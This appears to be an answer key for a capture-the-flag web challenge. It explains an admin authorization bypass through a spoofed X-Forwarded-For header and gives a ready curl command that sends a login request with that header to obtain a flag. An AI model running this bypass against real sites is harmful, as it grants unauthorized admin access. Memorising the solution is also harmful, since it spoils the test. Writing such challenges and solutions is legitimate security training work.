# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Authorization bypass via a spoofable `X-Forwarded-For` header. The
app treats requests whose `X-Forwarded-For` is `127.0.0.1`/`localhost` as internal
admins — trivially spoofable.

1. **Send the login POST with a spoofed `X-Forwarded-For: 127.0.0.1`:**

   ```
   curl -s -X POST http://<target>/index.php \
     -H "X-Forwarded-For: 127.0.0.1" -d "username=a&password=b"
   ```

2. **Extract the flag** (`FLAG{...}`) from the response and report it verbatim.
